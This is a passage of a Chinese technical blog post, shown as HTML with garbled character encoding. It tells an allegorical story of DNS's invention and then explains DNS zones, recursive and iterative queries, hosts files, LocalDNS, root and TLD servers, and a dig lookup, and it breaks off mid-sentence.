id="ç¬¬äºŒç« ï¼šå¤©æ‰å°‘å¹´çš„çµæ„Ÿ"><a href="#ç¬¬äºŒç« ï¼šå¤©æ‰å°‘å¹´çš„çµæ„Ÿ" class="headerlink" title="ç¬¬äºŒç« ï¼šå¤©æ‰å°‘å¹´çš„çµæ„Ÿ"></a><strong>ç¬¬äºŒç« ï¼šå¤©æ‰å°‘å¹´çš„çµæ„Ÿ</strong></h2><p>ä¸€å¤©ï¼Œé•‡ä¸Šçš„å¹´è½»å·¥ç¨‹å¸ˆ<strong>ä¿ç½—Â·è«å¡ä½©ç‰¹é‡Œæ–¯</strong>ï¼ˆPaul Mockapetrisï¼‰åœ¨é…’é¦†å–é…’ï¼Œå¬åˆ°æœ‰äººæŠ±æ€¨ï¼šâ€œè¦æ˜¯ç”µè¯ç°¿èƒ½è‡ªåŠ¨æ›´æ–°ï¼Œè¿˜èƒ½åˆ†åŒºåŸŸç®¡ç†å°±å¥½äº†ï¼â€<br>ä»–çµå…‰ä¸€é—ªï¼Œæå‡ºä¸€å¼ çš±å·´å·´çš„è‰çº¸ï¼Œç”»ä¸‹äº†ä¸€ä¸ª<strong>åˆ†å±‚åœ°å€ç³»ç»Ÿ</strong>çš„è®¾è®¡å›¾ï¼š</p><ol><li><strong>æ€»æœºï¼ˆæ ¹æœåŠ¡å™¨ï¼‰</strong>ï¼šåªè®°å½•æ¯ä¸ªâ€œå¤§åŒºâ€çš„æ¥çº¿å‘˜æ˜¯è°ã€‚</li><li><strong>åŒºåŸŸåˆ†æœºï¼ˆé¡¶çº§åŸŸæœåŠ¡å™¨ï¼‰</strong>ï¼šæ¯”å¦‚ <code>.com</code> åŒºã€<code>.edu</code> åŒºï¼Œè´Ÿè´£ç®¡ç†ä¸‹å±è¡—é“ã€‚</li><li><strong>è¡—é“åˆ†æœºï¼ˆæƒå¨æœåŠ¡å™¨ï¼‰</strong>ï¼šç›´æ¥ä¿ç®¡æ¯æˆ·äººå®¶çš„æœ€æ–°åœ°å€ã€‚</li></ol><p>ä»–å…´å¥‹åœ°å¤§å–Šï¼šâ€œä¸å†éœ€è¦ä¸€æœ¬å¤§ä¹¦ï¼é—®è·¯çš„äººæŒ‰å±‚çº§æŸ¥è¯¢ï¼Œå°±åƒæ‰“ç”µè¯è½¬æ¥åˆ†æœºï¼â€</p><hr><h2 id="ç¬¬ä¸‰ç« ï¼šDNSç³»ç»Ÿçš„è¯ç”Ÿ"><a href="#ç¬¬ä¸‰ç« ï¼šDNSç³»ç»Ÿçš„è¯ç”Ÿ" class="headerlink" title="ç¬¬ä¸‰ç« ï¼šDNSç³»ç»Ÿçš„è¯ç”Ÿ"></a><strong>ç¬¬ä¸‰ç« ï¼šDNSç³»ç»Ÿçš„è¯ç”Ÿ</strong></h2><p>ä¿ç½—è¿å¤œè¯´æœé•‡é•¿ï¼ˆäº’è”ç½‘å·¥ç¨‹ç»„IETFï¼‰ï¼Œåœ¨å°é•‡è¯•ç‚¹æ–°ç³»ç»Ÿâ€”â€”<strong>DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰</strong>ã€‚</p><ul><li><strong>åŸŸå</strong>ï¼šæ¯æˆ·äººå®¶æœ‰äº†æ˜“è®°çš„åå­—ï¼Œæ¯”å¦‚ <code>é¢åŒ…åº—.example.com</code>ã€‚</li><li><strong>è§£ææµç¨‹</strong>ï¼š<ol><li>å±…æ°‘é—®æ€»æœºï¼šâ€œ<code>.com</code> åŒºè°ç®¡ï¼Ÿâ€</li><li>æ€»æœºå›ç­”ï¼šâ€œå»é—® <code>.com</code> åŒºåˆ†æœºï¼â€</li><li><code>.com</code> åŒºåˆ†æœºè¯´ï¼šâ€œ<code>example.com</code> è¡—é“å½’ä¿ç½—å®¶çš„æœåŠ¡å™¨ç®¡ï¼â€</li><li>æœ€ç»ˆï¼Œä¿ç½—å®¶çš„æœåŠ¡å™¨ç»™å‡ºâ€œé¢åŒ…åº—â€çš„IPåœ°å€ï¼š<code>192.0.2.1</code>ã€‚</li></ol></li></ul><p><strong>å¥‡è¿¹å‘ç”Ÿäº†</strong>ï¼š</p><ul><li>åœ°å€ç°¿è‡ªåŠ¨æ›´æ–°ï¼Œå†ä¹Ÿä¸ç”¨å…¨é•‡æ´¾é€ï¼</li><li>æŸ¥è¯¢é€Ÿåº¦å¿«å¦‚é—ªç”µï¼Œè¿·è·¯çš„äººè¶Šæ¥è¶Šå°‘ã€‚</li><li>å°é•‡æ‰©å¼ æˆè¶…çº§åŸå¸‚ï¼ˆäº’è”ç½‘ï¼‰ï¼ŒDNSæˆäº†çœ‹ä¸è§çš„â€œå¯¼èˆªå‘˜â€ã€‚</li></ul><hr><h2 id="å°¾å£°ï¼šå°é•‡çš„é—äº§"><a href="#å°¾å£°ï¼šå°é•‡çš„é—äº§" class="headerlink" title="å°¾å£°ï¼šå°é•‡çš„é—äº§"></a><strong>å°¾å£°ï¼šå°é•‡çš„é—äº§</strong></h2><p>å¤šå¹´åï¼Œé˜¿å¸•é•‡æˆäº†å…¨çƒäº’è”ç½‘ï¼ŒDNSç³»ç»Ÿé»˜é»˜æ”¯æ’‘ç€äº¿ä¸‡æ¬¡æŸ¥è¯¢ã€‚</p><ul><li><strong>æ ¹æœåŠ¡å™¨</strong>åƒå®ˆæŠ¤ç¥ï¼Œå…¨çƒä»…æœ‰13ç»„ï¼ˆé•œåƒéå¸ƒå„åœ°ï¼‰ã€‚</li><li><strong>å±‚çº§ç®¡ç†</strong>è®©æ¯ä¸ªç¤¾åŒºï¼ˆåŸŸåï¼‰è‡ªæ²»ï¼Œæ— éœ€ä¸­å¤®é›†æƒã€‚</li><li>ä¿ç½—çš„åå­—è¢«åˆ»åœ¨â€œäº’è”ç½‘åäººå ‚â€ï¼Œè€Œé‚£æœ¬æ—§ç”µè¯ç°¿ï¼Œæˆäº†åšç‰©é¦†é‡Œçš„å¤è‘£ã€‚</li></ul><hr><h2 id="éšå–»è§£è¯»"><a href="#éšå–»è§£è¯»" class="headerlink" title="éšå–»è§£è¯»"></a><strong>éšå–»è§£è¯»</strong></h2><ul><li><strong>ç”µè¯ç°¿</strong> <code>hosts.txt</code> â†’ æ—©æœŸé™æ€ä¸»æœºæ–‡ä»¶</li><li><strong>æ€»æœºâ†’åŒºåŸŸåˆ†æœºâ†’è¡—é“åˆ†æœº</strong> â†’ DNSæ ¹æœåŠ¡å™¨â†’é¡¶çº§åŸŸâ†’æƒå¨æœåŠ¡å™¨</li><li><strong>éª‘é©¬é€ä¹¦</strong> â†’ æ‰‹åŠ¨æ›´æ–°ä¸»æœºæ–‡ä»¶çš„ä½æ•ˆ</li><li><strong>åˆ†å±‚æŸ¥è¯¢</strong> â†’ DNSé€’å½’&#x2F;è¿­ä»£è§£ææµç¨‹</li></ul><p>åœ¨æ—©æœŸè®¡ç®—æœºç³»ç»Ÿçš„é€šä¿¡ä¸ä¾¿ä¸‹ï¼Œè¿™ä¾¿æˆå°±äº†DNS</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="åŒºåŸŸ"><a href="#åŒºåŸŸ" class="headerlink" title="åŒºåŸŸ"></a>åŒºåŸŸ</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200914104025076.png" alt="20200914104025076"></p><p>å…¶ä¸­é¡¶çº§åŸŸï¼ˆTLDï¼‰æœ‰ <code>arpa</code>ã€<code>com</code>ã€<code>edu</code>ã€<code>gov</code>â€¦</p><p>é¡¶çº§åŸŸåˆ†ä¸ºä¸¤ç§ç±»å‹ï¼š</p><ol><li><code>gTLDs</code>: <code>.com</code>ã€<code>.org</code> ç­‰å«åš<code>ä¸€èˆ¬é€šç”¨é¡¶çº§åŸŸ</code></li><li><code>ccTLDs</code>: <code>.cn</code>ã€<code>.jp</code> ç­‰å«åš<code>å›½å®¶é¡¶çº§åŸŸ</code></li><li><code>arpa</code>ï¼šç‰¹æ®ŠåŸŸï¼Œæ¯”è¾ƒç‰¹æ®Šæ”¾åœ¨ä¸‹é¢è®²</li></ol><p>ä¸€ä¸ª DNS å­æ ‘ï¼ˆç‹¬ç«‹ç®¡ç†çš„ï¼‰å°±ç§°ä¸ºä¸€ä¸ª<code>åŒºåŸŸ</code>ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ <code>sina.com.cn</code> è¿™ä¸ªäºŒçº§åŸŸï¼Œå¯ä»¥å°†å®ƒçš„åŒºåŸŸåˆ’åˆ†ä¸ºæ›´å°çš„åŒºåŸŸï¼Œæ¯”å¦‚ä¸€èˆ¬ä¼šæ ¹æ®ç”¨é€”æ¥åˆ’åˆ†åŒºåŸŸï¼Œå‡è®¾ <code>blog.sina.com.cn</code> ä¸ºåšå®¢ç›¸å…³çš„åŸŸåç­‰ç­‰ã€‚åˆ’åˆ†å®Œå­åŒºåŸŸä¹‹åï¼Œéœ€è¦ç»è¿‡çˆ¶åŒºåŸŸçš„æˆæƒï¼Œè¿™æ ·çˆ¶åŒºåŸŸé‡åˆ°å±äºå­åŒºåŸŸä¸‹çš„åŸŸåï¼Œå°±ä¼šè½¬ç»™å­åŒºåŸŸæ¥è§£æã€‚</p><h3 id="æŸ¥è¯¢æ–¹å¼"><a href="#æŸ¥è¯¢æ–¹å¼" class="headerlink" title="æŸ¥è¯¢æ–¹å¼"></a>æŸ¥è¯¢æ–¹å¼</h3><p>åœ¨è¯´æµç¨‹ä¹‹å‰ï¼Œå…ˆè¯´ä¸€ä¸‹æŸ¥è¯¢æ–¹å¼ã€‚å¾ˆç®€å•ï¼Œåˆ†ä¸º 2 ç§ï¼š</p><ol><li>é€’å½’æŸ¥è¯¢ï¼šA -&gt; B -&gt; Cï¼ŒA å‘ B å‘èµ· DNS è§£æçš„è¯·æ±‚ä¹‹åï¼ŒB å¸® A å» C é‚£é‡ŒæŸ¥æ‰¾ï¼Œæ‹¿åˆ°ç»“æœä¹‹åè¿”å›ç»™ Aï¼Œè¿™ä¸ªæ—¶å€™ Aã€B å„å‘èµ·äº†ä¸€æ¬¡è§£æè¯·æ±‚ã€‚</li><li>è¿­ä»£æŸ¥è¯¢ï¼šA -&gt; B, A -&gt; Cï¼ŒA å‘ B å‘èµ· DNS è§£æçš„è¯·æ±‚ä¹‹åï¼ŒB å‘Šè¯‰ A è¦å» C é‚£é‡ŒæŸ¥æ‰¾ï¼ŒA å†å‘ C å‘èµ· DNS è§£æè¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™ A ä¸€å…±å‘èµ·äº†ä¸¤æ¬¡è§£æè¯·æ±‚ï¼ŒB æ²¡æœ‰å‘èµ· DNS è§£æè¯·æ±‚ã€‚</li></ol><h2 id="Hosts-æ–‡ä»¶ï¼ˆé™æ€-DNS-æœåŠ¡å™¨ï¼‰"><a href="#Hosts-æ–‡ä»¶ï¼ˆé™æ€-DNS-æœåŠ¡å™¨ï¼‰" class="headerlink" title="Hosts æ–‡ä»¶ï¼ˆé™æ€ DNS æœåŠ¡å™¨ï¼‰"></a>Hosts æ–‡ä»¶ï¼ˆé™æ€ DNS æœåŠ¡å™¨ï¼‰</h2><p>åœ¨windowsä¸‹çš„hostsæ–‡ä»¶å­˜æ”¾åœ¨<code>C:\Windows\System32\drivers\etc\hosts</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This file contains the mappings of IP addresses to host names. Each</span><br><span class="hljs-comment"># entry should be kept on an individual line. The IP address should</span><br><span class="hljs-comment"># be placed in the first column followed by the corresponding host name.</span><br><span class="hljs-comment"># The IP address and the host name should be separated by at least one</span><br><span class="hljs-comment"># space.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="hljs-comment"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># For example:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#      102.54.94.97     rhino.acme.com          # source server</span><br><span class="hljs-comment">#       38.25.63.10     x.acme.com              # x client host</span><br><br><span class="hljs-comment"># localhost name resolution is handled within DNS itself.</span><br><span class="hljs-comment">#127.0.0.1       localhost</span><br><span class="hljs-comment">#::1             localhost</span><br><span class="hljs-comment"># Added by Docker Desktop</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> host.docker.internal<br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> gateway.docker.internal<br><span class="hljs-comment"># To allow the same kube context to work on the host and the container:</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> kubernetes.docker.internal<br><span class="hljs-comment"># End of section</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> localhost<br></code></pre></td></tr></table></figure><p>åœ¨linuxä¸‹å¯ä»¥è®¿é—®&#x2F;etc&#x2F;hostsæŸ¥çœ‹</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir"> cat /etc/hosts<br><span class="hljs-comment"># This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf: #ä½¿ç”¨çš„æ˜¯wslå­ç³»ç»Ÿ</span><br><span class="hljs-comment"># [network]</span><br><span class="hljs-comment"># generateHosts = false</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>       localhost<br><span class="hljs-number">127.0</span>.<span class="hljs-number">1.1</span>       <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span>.        <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span><br><br><span class="hljs-comment"># The following lines are desirable for IPv6 capable hosts</span><br>::<span class="hljs-number">1</span>     ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span> ip6-localnet<br>ff00::<span class="hljs-number">0</span> ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span> ip6-allnodes<br>ff02::<span class="hljs-number">2</span> ip6-allrouters<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§<code>127.0.01</code>è¢«æ˜ å°„åˆ°<code>localhost</code> å…¶å®è®¿é—®<code>127.0.0.1</code>å°±æ˜¯åœ¨æˆ¿è®¿é—®<code>localhost</code></p><p>Hosts æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ç†è§£ä¸ºæ˜¯æœ¬åœ°é™æ€çš„ DNS æœåŠ¡å™¨ã€‚éœ€è¦è§£æ DNS çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä» Hosts æ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„ ip-åŸŸå æ˜ å°„å…³ç³»ï¼Œä¸€æ—¦æ‰¾åˆ°é‚£ä¹ˆå°±å®Œæˆè§£æäº†ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ç»§ç»­è§£ææµç¨‹ã€‚ä¼˜å…ˆçº§é«˜äºç½‘ç»œDNSè§£ææœåŠ¡ï¼Œæ‰€æœ‰å¯ä»¥åŠ å¿«åŸŸåè§£æã€å±è”½åƒåœ¾ç½‘ç«™ã€å¹¿å‘Šç­‰ç­‰</p><h2 id="LocalDNS-æœåŠ¡å™¨"><a href="#LocalDNS-æœåŠ¡å™¨" class="headerlink" title="LocalDNS æœåŠ¡å™¨"></a>LocalDNS æœåŠ¡å™¨</h2><p>è‹¥ Hosts æ–‡ä»¶ä¸­æ²¡æœ‰ç›¸å…³åŸŸåçš„è®°å½•ï¼Œåˆ™æ¥åˆ°äº† LocalDNSã€‚</p><p>åœ¨windowsä¸­ï¼Œå¦‚æœ <code>hosts</code> æ–‡ä»¶ä¸­æ²¡æœ‰ç›¸å…³åŸŸåçš„è®°å½•ï¼Œç³»ç»Ÿä¼šä¾èµ–æœ¬åœ°ç½‘ç»œé…ç½®ä¸­çš„ DNS æœåŠ¡å™¨è¿›è¡ŒåŸŸåè§£æã€‚Windows çš„æœ¬åœ° DNS é…ç½®å­˜å‚¨åœ¨ <strong>ç½‘ç»œé€‚é…å™¨çš„è®¾ç½®ä¸­</strong>æ— æ³•å…·ä½“å‘ˆç°ï¼Œ</p><p>ä½†æ˜¯åœ¨linuxä¸­å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼š<code>/etc/resolv.conf</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /etc/resolv.<span class="hljs-keyword">conf</span><br># This <span class="hljs-keyword">file</span> was automatically generated by WSL. To <span class="hljs-keyword">stop</span> automatic generation of this <span class="hljs-keyword">file</span>, <span class="hljs-built_in">add</span> the following entry <span class="hljs-keyword">to</span> /etc/wsl.<span class="hljs-keyword">conf</span>:<br># [network]<br># generateResolvConf = false<br>nameserver <span class="hljs-number">10</span>.xxx.xxx.xxx<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä»€ä¹ˆæ—¶å€™ç”Ÿæˆçš„å‘¢ï¼ŸDHCP(åŠ¨æ€ä¸»æœºé…ç½®åè®®) çš„æ—¶å€™ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œçš„ ip ç»å¸¸æ˜¯å†…ç½‘ ipï¼Œå¹¶ä¸” LocalDNS é‡Œé¢æœ‰ä¸ª â€œlocalâ€ï¼Œå¤§å®¶å¯èƒ½ä¼šè®¤ä¸º LocalDNS çš„æœåŠ¡å™¨ ip éƒ½æ˜¯å†…ç½‘ ipï¼Œå®é™…ä¸Šä¹Ÿå¯ä»¥æ˜¯å¤–ç½‘ ipï¼Œæ¯”å¦‚å…¶ä»–ç»„ç»‡æä¾›çš„ DNSï¼Œåƒè°·æ­Œçš„<code>8.8.8.8</code>å•¦ï¼Œå›½å†…çš„<code>114.114.114.114</code>å•¦ã€‚ä¸ªäººæ„Ÿè§‰æ˜¯è¿™äº› DNS çš„åœ°å€å¡«å†™åœ¨æˆ‘ä»¬æœ¬åœ°çš„ç”µè„‘æˆ–è€…ç§»åŠ¨è®¾å¤‡ä¸Šï¼Œæ‰€ä»¥ç§°ä¸º LocalDNS</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒLocalDNS æœ¬èº«ä¸å…·å¤‡çœŸæ­£çš„è§£æåŸŸåçš„åŠŸèƒ½ã€‚å®ƒçš„ä½œç”¨æœ‰ä¸¤ä¸ªï¼š</p><ol><li>ä»£æ›¿ç”¨æˆ·çš„è®¾å¤‡å‚ä¸åŸŸåè§£æ</li><li>ç¼“å­˜åŸŸåçš„æŸ¥è¯¢è®°å½•ï¼Œå½“å…¶ä»–è®¾å¤‡å‘èµ·ç›¸åŒçš„åŸŸåæŸ¥è¯¢è¯·æ±‚æ—¶å¯ä»¥ç›´æ¥è¿”å›æŸ¥è¯¢ç»“æœï¼Œå¯ä»¥åŠ å¿«åŸŸåæŸ¥è¯¢é€Ÿåº¦ã€‚</li></ol><p>ç”¨æˆ·è®¾å¤‡ -&gt;æ£€æŸ¥hostsæ–‡ä»¶-&gt; LocalDNS ä¸€èˆ¬æ˜¯é€’å½’æŸ¥è¯¢ï¼Œè€Œ LocalDNS å‘ç°å®ƒè‡ªå·±æ²¡æœ‰ç¼“å­˜å¯¹åº”çš„æ•°æ®åï¼Œåˆ™éœ€è¦å‘ DNS æ ¹æœåŠ¡å™¨å‘èµ·æŸ¥è¯¢è¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚ï¼Œä¸€èˆ¬æ˜¯è¿­ä»£æŸ¥è¯¢ã€‚æ‰€ä»¥ä»»ä½• LocalDNS éƒ½éœ€çŸ¥é“ DNS æ ¹æœåŠ¡å™¨çš„ ip åœ°å€ã€‚</p><h2 id="DNS-æ ¹æœåŠ¡å™¨"><a href="#DNS-æ ¹æœåŠ¡å™¨" class="headerlink" title="DNS æ ¹æœåŠ¡å™¨"></a>DNS æ ¹æœåŠ¡å™¨</h2><p>DNS æ ¹æœåŠ¡å™¨ï¼ˆroot name serverï¼‰ï¼Œå…¨çƒåªæœ‰ <code>13</code> ä¸ªï¼Œç¼–å·ä» <code>a.root-servers.net</code> ä¸€ç›´åˆ° <code>m.root-servers.net</code>ã€‚ä¹‹æ‰€ä»¥ä¸è¯´ 13 å°ï¼Œæ˜¯å› ä¸ºæ¯ä¸ª DNS æ ¹èŠ‚ç‚¹éƒ½ä¼šæœ‰å¤šä¸ªæœåŠ¡å™¨è´Ÿè´£å‡è¡¡æŸ¥è¯¢ï¼ˆå³ä»»æ’­èŠ‚ç‚¹ï¼‰ï¼Œä½ å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™æŸ¥è¯¢ï¼š<a href="https://root-servers.org/">https://root-servers.org/</a> ã€‚</p><p>ç°åœ¨è§£æ DNS çš„æ—¶å€™ï¼Œå·²ç»ä¸å†éœ€è¦çŸ¥é“ DNS æ ¹æœåŠ¡å™¨çš„çœŸæ­£çš„ ip åœ°å€ï¼Œåªéœ€è¦çŸ¥é“ä»»æ’­èŠ‚ç‚¹çš„ipåœ°å€å°±å¯ä»¥åœ¨ä¸–ç•Œå„åœ°ä¸å½“åœ°çš„æœ€ä¼˜èŠ‚ç‚¹è¿›è¡Œé€šä¿¡äº†ï¼Œæ‰€ä»¥ç°åœ¨å¤§å¤šæ•°çš„ DNS æ ¹æœåŠ¡å™¨çš„ ip åœ°å€éƒ½æ˜¯ä»»æ’­èŠ‚ç‚¹ çš„ ip åœ°å€ã€‚è¿™æ ·é€Ÿåº¦æœ€å¿«</p><p>æ‰€ä»¥ï¼ŒDNS æ ¹æœåŠ¡å™¨æŒç®¡ç€æ‰€æœ‰ <code>DNS é¡¶çº§åŸŸåæœåŠ¡å™¨</code> çš„åœ°å€ï¼Œæ¯”å¦‚å¤§å®¶ç†Ÿæ‚‰çš„ <code>.com</code>ã€<code>.org</code>ã€<code>.edu</code> ç­‰ç­‰ã€‚å‡å¦‚æˆ‘ä»¬æŸ¥è¯¢çš„é¡¶çº§åŸŸåæ˜¯ <code>.com</code>ï¼ŒDNS æ ¹æœåŠ¡å™¨ä¼šå°†<code>.com</code> é¡¶çº§åŸŸåæœåŠ¡å™¨çš„åœ°å€å‘å›ç»™ LocalDNS æœåŠ¡å™¨ï¼Œè®©å®ƒè‡ªå·±å»é‚£é‡ŒæŸ¥ã€‚äºæ˜¯ LocalDNS æœåŠ¡å™¨å†å‘æ‰‹æ¡ <code>.com</code> çš„ DNS é¡¶çº§åŸŸåæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢</p><h2 id="DNS-é¡¶çº§åŸŸåæœåŠ¡å™¨"><a href="#DNS-é¡¶çº§åŸŸåæœåŠ¡å™¨" class="headerlink" title="DNS é¡¶çº§åŸŸåæœåŠ¡å™¨"></a>DNS é¡¶çº§åŸŸåæœåŠ¡å™¨</h2><p>æ‰‹æ¡ <code>.com</code> çš„ DNS é¡¶çº§åŸŸåæœåŠ¡å™¨ä¸€çœ‹æ¥æºçš„æŸ¥è¯¢æ˜¯ <code>xxx.com</code>ï¼ŒæŒ‰ç†æ¥è¯´åº”è¯¥å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„ ip å¹¶ç›´æ¥è¿”å›äº†ã€‚ä½†æ˜¯ç°åœ¨åŸºæœ¬ä¸Šéƒ½æ˜¯æˆæƒç»™å…¶ä»–å‚å®¶å»åšçš„ï¼Œè¢«æˆæƒçš„å«<code>DNS æƒå¨åŸŸåæœåŠ¡å™¨</code>ï¼Œæˆ–è€…ä¼ä¸šè‡ªå»ºçš„ DNS æœåŠ¡å™¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè§£æä¸€ä¸‹<code>baidu.com</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">~$ dig baidu.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.24.04.1-Ubuntu &lt;&lt;&gt;&gt; baidu.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 46978</span><br><span class="hljs-string">;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; MBZ: 0x0001, udp: 1232</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;baidu.com.                     IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">baidu.com.              1       IN      A       198.18.0.6</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 0 msec</span><br><span class="hljs-string">;; SERVER: 10.255.255.254#53(10.255.255.254) (UDP)</span><br><span class="hljs-string">;; WHEN: Mon Jan 27 18:59:34 CST 2025</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 54</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¡¨ç¤ºæŸ¥è¯¢é¦–å…ˆç»è¿‡äº†<code>10.255.255.254</code>ï¼ˆæœ¬åœ°çš„localDNSï¼‰è®¾ç½®çš„DNSè§£æåœ°å€,å¦‚æœæœ¬åœ°æ²¡æœ‰å¯¹åº”çš„ç¼“å­˜è®°å½•,ä»–å°±ä¼šå‘èµ·é€’å½’æŸ¥è¯¢ï¼Œé¦–å…ˆå‘<strong>æœ€è¿‘çš„ä¼ æ’­èŠ‚ç‚¹</strong>æŸ¥è¯¢<code>baidu.com</code>çš„é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼ˆ<code>.com</code> çš„æƒå¨æœåŠ¡å™¨ï¼‰ã€‚èŠ‚ç‚¹ä¼šè¿”å› <code>.com</code> çš„æƒå¨æœåŠ¡å™¨åœ°å€ã€‚LocalDNS å†å‘ <code>.com</code> çš„æƒå¨æœåŠ¡å™¨æŸ¥è¯¢ <code>baidu.com</code> çš„æƒå¨æœåŠ¡å™¨ã€‚<code>.com</code> çš„æƒå¨æœåŠ¡å™¨è¿”å› <code>baidu.com</code> çš„æƒå¨åŸŸåæœåŠ¡å™¨åœ°å€,LocalDNS æœ€ç»ˆå‘ <code>dns.baidu.com</code> æŸ¥è¯¢ï¼Œè·å–åˆ°å®é™…çš„ipåœ°å€ï¼Œ</p><p>è¿™ä¸ªæ—¶å€™ LocalDNS æœåŠ¡å™¨å°±ä¼šç¼“å­˜ <code>baidu.com</code> çš„ DNS æƒå¨åŸŸåæœåŠ¡å™¨ï¼Œå…å¾—ä¸‹æ¬¡æŸ¥çš„æ—¶å€™è¿˜å¾—å†èµ°ä¸€éä¹‹å‰çš„æµç¨‹ï¼ˆå½“ç„¶æ˜¯åœ¨ç¼“å­˜æœªè¿‡æœŸçš„æƒ…å†µä¸‹ï¼‰ã€‚</p><h2 id="DNS-æƒå¨åŸŸåæœåŠ¡å™¨"><a href="#DNS-æƒå¨åŸŸåæœåŠ¡å™¨" class="headerlink" title="DNS æƒå¨åŸŸåæœåŠ¡å™¨"></a>DNS æƒå¨åŸŸåæœåŠ¡å™¨</h2><p>DNS æƒå¨åŸŸåæœåŠ¡å™¨è¦æå‰ç”³è¯· DNS è§£ææˆæƒï¼Œè¿™ç±» DNS åŸŸåæœåŠ¡å™¨ä¸€èˆ¬æŒç®¡ç€ç‰¹å®šåŸŸä¸‹æ‰€æœ‰çš„å­åŸŸå’Œä¸»æœºï¼Œæ¯”å¦‚å®ƒä¸ä»…çŸ¥é“ <code>baidu.com</code> çš„ ipï¼ŒåŒæ 